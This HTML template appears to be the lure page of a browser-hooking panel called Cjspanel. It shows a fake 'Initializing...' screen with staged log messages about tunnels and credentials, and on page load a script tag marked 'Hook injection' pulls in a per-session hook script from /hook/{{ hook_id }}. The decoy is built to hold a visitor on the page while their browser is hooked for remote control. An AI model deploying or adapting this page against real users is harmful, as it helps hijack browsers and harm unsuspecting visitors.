<!DOCTYPE html>
<html>
<head>
    <title>Payload Demo - Cjspanel</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }

        body {
            font-family: 'Share Tech Mono', monospace;
            background: #0a0a0a;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            color: #00ff00;
            overflow: hidden;
        }

        body::before {
            content: '';
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            pointer-events: none;
            background: repeating-linear-gradient(0deg, rgba(0,0,0,0.1), rgba(0,0,0,0.1) 1px, transparent 1px, transparent 2px);
        }

        .container {
            text-align: center;
            padding: 40px;
            background: rgba(0, 20, 0, 0.8);
            border: 1px solid rgba(0, 255, 0, 0.3);
            border-radius: 10px;
            max-width: 400px;
            box-shadow: 0 0 50px rgba(0, 255, 0, 0.2);
        }

        .loading-icon {
            font-size: 60px;
            margin-bottom: 20px;
            color: #00ff00;
            animation: pulse 2s ease-in-out infinite;
            filter: drop-shadow(0 0 15px #00ff00);
        }

        @keyframes pulse {
            0%, 100% { transform: scale(1); filter: drop-shadow(0 0 10px #00ff00); }
            50% { transform: scale(1.1); filter: drop-shadow(0 0 30px #00ff00); }
        }

        h1 {
            font-family: 'Orbitron', sans-serif;
            font-size: 24px;
            margin-bottom: 15px;
            text-shadow: 0 0 20px #00ff00;
        }

        .loading-text {
            font-size: 14px;
            color: rgba(0, 255, 0, 0.7);
            margin-bottom: 30px;
        }

        .progress-bar {
            width: 100%;
            height: 4px;
            background: rgba(0, 255, 0, 0.2);
            border-radius: 2px;
            overflow: hidden;
            margin-bottom: 20px;
        }

        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #00ff00, #ff3b3b, #00ff00);
            background-size: 200% 100%;
            animation: progress 2s linear infinite;
            width: 100%;
        }

        @keyframes progress {
            0% { background-position: 0% 0%; }
            100% { background-position: 200% 0%; }
        }

        .status-log {
            text-align: left;
            font-size: 11px;
            padding: 15px;
            background: rgba(0, 0, 0, 0.5);
            border-radius: 5px;
            max-height: 150px;
            overflow-y: auto;
        }

        .log-line {
            margin-bottom: 5px;
            opacity: 0;
            animation: fadeIn 0.5s forwards;
        }

        .log-line:nth-child(1) { animation-delay: 0.5s; }
        .log-line:nth-child(2) { animation-delay: 1s; }
        .log-line:nth-child(3) { animation-delay: 1.5s; }
        .log-line:nth-child(4) { animation-delay: 2s; }
        .log-line:nth-child(5) { animation-delay: 2.5s; }

        @keyframes fadeIn {
            to { opacity: 1; }
        }

        .log-line .tag { color: #ff3b3b; }
        .log-line .success { color: #00ff00; }
        .log-line .warning { color: #ffcc00; }

        .hook-id {
            font-size: 10px;
            color: rgba(0, 255, 0, 0.4);
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="loading-icon"><i class="fa-solid fa-spinner fa-spin"></i></div>
        <h1>Initializing...</h1>
        <p class="loading-text">Please wait while we establish connection</p>

        <div class="progress-bar">
            <div class="progress-fill"></div>
        </div>

        <div class="status-log">
            <div class="log-line"><span class="tag">[SYS]</span> <span class="success">Connection initiated...</span></div>
            <div class="log-line"><span class="tag">[NET]</span> <span class="success">Establishing secure tunnel...</span></div>
            <div class="log-line"><span class="tag">[SEC]</span> <span class="warning">Verifying credentials...</span></div>
            <div class="log-line"><span class="tag">[API]</span> <span class="success">Loading resources...</span></div>
            <div class="log-line"><span class="tag">[RDY]</span> <span class="success">System ready</span></div>
        </div>

        <div class="hook-id">Session: {{ hook_id }}</div>
    </div>

    <!-- Hook injection -->
    <script src="/hook/{{ hook_id }}"></script>
</body>
</html>
